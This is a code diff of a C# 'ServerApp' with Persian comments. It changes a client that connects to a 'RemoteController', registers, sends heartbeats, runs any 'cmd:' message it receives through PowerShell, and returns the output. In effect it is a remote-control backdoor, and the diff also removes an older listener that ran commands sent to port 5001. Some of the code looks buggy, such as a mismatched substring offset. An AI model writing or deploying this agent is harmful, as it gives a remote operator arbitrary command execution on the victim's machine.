@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Diagnostics;
+using System.Diagnostics.Eventing.Reader;
 using System.IO;
 using System.Net;
 using System.Net.Sockets;
@@ -12,6 +13,7 @@ namespace ServerApp
     class Program
     {
         public static bool flag = false;
+        public static bool flag1 = false;
         const string controllerIp = "127.0.0.1"; // آدرس IP RemoteController
         const int port = 5000; // پورتی که سرور گوش می‌دهد
         const int cport = 5001; // پورتی که سرور گوش می‌دهد
@@ -20,113 +22,138 @@ namespace ServerApp
         static TcpListener command_listener;
         static void Main(string[] args)
         {
-
-
             Thread thread1 = new Thread(() =>
             {
+                TcpClient client = null;
+
+                // حلقه تلاش برای اتصال به کنترلر
                 while (true)
                 {
                     try
                     {
-                        using (TcpClient client = new TcpClient())
-                        {
-                            Console.WriteLine("\nAttempting to connect to RemoteController...");
-                            client.Connect(controllerIp, port); // تلاش برای اتصال
-
-                            using (NetworkStream stream = client.GetStream())
-                            using (StreamWriter writer = new StreamWriter(stream, Encoding.UTF8) { AutoFlush = true })
-                            {
-                                if (!flag)
-                                {
-                                    writer.WriteLine($"register:{clientName}");
-                                    Console.WriteLine("\nRegistration message sent.");
-                                    flag = true;
-                                }
-                                else
-                                {
-                                    writer.WriteLine($"heartbeat from:{clientName}");
-                                    Console.WriteLine("\nHeartbeat message sent.");
-                                }
-                            }
-                        }
+                        client = new TcpClient();
+                        Console.WriteLine("\nAttempting to connect to RemoteController...");
+                        client.Connect(controllerIp, port); // تلاش برای اتصال
+                        Console.WriteLine("Connected to RemoteController.");
+                        break; // خروج از حلقه در صورت اتصال موفق
                     }
                     catch (SocketException)
                     {
-                        Console.WriteLine("\nController is not available. Retrying...");
+                        Console.WriteLine("\nController is not available. Retrying in 5 seconds...");
+                        Thread.Sleep(5000); // انتظار برای تلاش مجدد
                     }
-                    catch (Exception ex)
+                }
+
+                try
+                {
+                    NetworkStream stream = client.GetStream();
+                    StreamReader reader = new StreamReader(stream, Encoding.UTF8);
+                    StreamWriter writer = new StreamWriter(stream, Encoding.UTF8) { AutoFlush = true };
+
+                    while (true)
                     {
-                        Console.WriteLine($"Error in thread1: {ex.Message}");
+                        try
+                        {
+                            if (!flag)
+                            {
+                                writer.WriteLine($"register:{clientName}");
+                                Console.WriteLine("\nRegistration message sent.");
+                                flag = true;
+                            }
+                            else
+                            {
+                                writer.WriteLine($"heartbeat:{clientName}");
+                                Console.WriteLine("\nHeartbeat message sent.");
+                            }
+
+                            // بررسی دستورات از کنترلر
+                            while (stream.DataAvailable)
+                            {
+                                // خواندن پیام و حذف فضای خالی یا کاراکتر اضافی
+                                string message = "";
+                                
+                                 message = reader.ReadLine();
+                                Console.WriteLine($"\nRaw message received: {message}");
+
+                                if (!string.IsNullOrEmpty(message))
+                                {
+                                    if (message.StartsWith("cmd:")) // دستور
+                                    {
+                                        if (!flag1)
+                                        {
+                                            string command = message.Substring(4);
+                                            Console.WriteLine($"\nCommand received: {command}");
+
+                                            // اجرای دستور CMD
+                                            string result = ExecuteCommand(command);
+                                            Console.WriteLine($"\nResult: {result}");
+
+                                            // ارسال نتیجه
+                                            string[] resultLines = result.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);
+                                            foreach (var line in resultLines)
+                                            {
+                                                writer.WriteLine($"result:{line}");
+                                            }
+                                            writer.WriteLine("endresult");
+                                            message = "";
+                                            flag1 = true;
+                                        }
+                                        else
+                                        {
+                                            string command = message.Substring(5);
+                                            Console.WriteLine($"\nCommand received: {command}");
+
+                                            // اجرای دستور CMD
+                                            string result = ExecuteCommand(command);
+                                            Console.WriteLine($"\nResult: {result}");
+
+                                            // ارسال نتیجه
+                                            string[] resultLines = result.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);
+                                            foreach (var line in resultLines)
+                                            {
+                                                writer.WriteLine($"result:{line}");
+                                            }
+                                            writer.WriteLine("endresult");
+                                            message = "";
+
+                                        }
+                                        
+                                    }
+                                    
+                                    else
+                                    {
+                                        Console.WriteLine($"Unknown message: {message}");
+                                    }
+                                }
+
+                                // تخلیه بافر برای پاک‌سازی داده‌های باقی‌مانده
+                                reader.DiscardBufferedData();
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine($"Error while processing data: {ex.Message}");
+                            break;
+                        }
+
+                        Thread.Sleep(5000); // تأخیر قبل از ارسال پیام بعدی
                     }
 
-                    Thread.Sleep(10000); // تأخیر قبل از تلاش مجدد
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Error in communication: {ex.Message}");
+                }
+                finally
+                {
+                    client?.Close();
+                    Console.WriteLine("Connection to RemoteController closed.");
                 }
             });
 
             thread1.Start();
 
-            Thread thread2 = new Thread(() =>
-            {
-
-                command_listener = new TcpListener(IPAddress.Any, cport);
-               
-                while (true)
-                {
-                    try
-                    {
-                        command_listener.Start();
-                        TcpClient client = command_listener.AcceptTcpClient();
-                        Console.WriteLine("\nClient connected.");
-
-                        using (NetworkStream stream = client.GetStream())
-                        using (StreamReader reader = new StreamReader(stream, Encoding.UTF8))
-                        using (StreamWriter writer = new StreamWriter(stream, Encoding.UTF8) { AutoFlush = true })
-                        {
-                            string command = reader.ReadLine();
-                            Console.WriteLine($"\nCommand received: {command}");
-
-                            // اجرای دستور CMD
-                            string result = ExecuteCommand(command);
-                            Console.WriteLine($"\nResult: {result}");
-
-                            // ارسال نتیجه به کلاینت
-                            writer.WriteLine(result);
-                        }
-                        client.Close();
-                    }
-                    catch (Exception ex)
-                    {
-                        Console.WriteLine($"Error: {ex.Message}");
-                    }
-                    finally
-                    {
-                        if (command_listener != null)
-                        {
-                            command_listener.Stop();
-                            Console.WriteLine("Listener on port 5001 stopped.");
-                        }
-                    }
-                    Thread.Sleep(1000); // تأخیر قبل از تلاش مجدد
-                }
-            });
-            thread2.Start();
-            bool IsPortListening(string ipAddress, int port)
-            {
-                try
-                {
-                    using (TcpClient client = new TcpClient())
-                    {
-                        client.Connect(ipAddress, port); // تلاش برای اتصال
-                        client.Dispose();
-                        return true; // اگر اتصال موفق باشد، یعنی پورت در حال گوش دادن است
-
-                    }
-                }
-                catch (SocketException)
-                {
-                    return false; // اگر خطا رخ داد، یعنی کسی گوش نمی‌دهد
-                }
-            }
+           
             Thread thread3 = new Thread(() =>
             {
                
@@ -210,7 +237,7 @@ namespace ServerApp
                 {
                     StartInfo = new ProcessStartInfo
                     {
-                        FileName = "cmd.exe",
+                        FileName = "powershell.exe",
                         Arguments = $"/c {command}",
                         RedirectStandardOutput = true,
                         RedirectStandardError = true,
